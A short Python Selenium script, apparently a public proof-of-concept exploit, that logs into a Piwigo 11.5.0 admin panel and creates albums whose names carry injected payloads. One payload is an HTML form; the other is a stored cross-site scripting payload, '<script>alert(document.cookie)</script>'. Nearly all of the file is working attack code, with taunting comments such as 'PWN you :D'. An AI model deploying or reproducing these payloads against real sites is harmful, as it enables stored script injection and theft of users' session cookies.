#!/usr/bin/python3
# Author: @nu11secur1ty

from selenium import webdriver
import time


#enter the link to the website you want to automate login.
website_link="http://192.168.1.160/Piwigo-11.5.0/"

#enter your login username
username="admin"

#enter your login password
password="password"

#enter the element for username input field
element_for_username="username"
#enter the element for password input field
element_for_password="password"
#enter the element for submit button
element_for_submit="login"

#browser = webdriver.Safari()	#for macOS users[for others use chrome vis chromedriver]
browser = webdriver.Chrome()	#uncomment this line,for chrome users
#browser = webdriver.Firefox()	#uncomment this line,for chrome users

browser.get((website_link))	

try:
	username_element = browser.find_element_by_name(element_for_username)
	username_element.send_keys(username)		
	password_element  = browser.find_element_by_name(element_for_password)
	password_element.send_keys(password)
	signInButton = browser.find_element_by_name(element_for_submit)
	signInButton.click()
	
	# Exploit .ini
	browser.get(("http://192.168.1.160/Piwigo-11.5.0/admin.php?page=cat_list"))
	# PWN you :D
	browser.execute_script("document.querySelector('.addAlbumHead > .icon-plus-circled').click()")
	browser.execute_script("document.querySelector('[name=\"virtual_name\"]').value = '"'<form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>'"'") 
	time.sleep(1)
	browser.execute_script("document.querySelector('[name=\"submitAdd\"]').click()")
	
	# Pwned You Twice :D
	browser.execute_script("document.querySelector('.addAlbumHead > .icon-plus-circled').click()")
	browser.execute_script("document.querySelector('[name=\"virtual_name\"]').value = '<script>alert(document.cookie)</script>'") 
	time.sleep(1)
	browser.execute_script("document.querySelector('[name=\"submitAdd\"]').click()")
	print("payload is deployed Pwned You Twice :D...\n")
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")
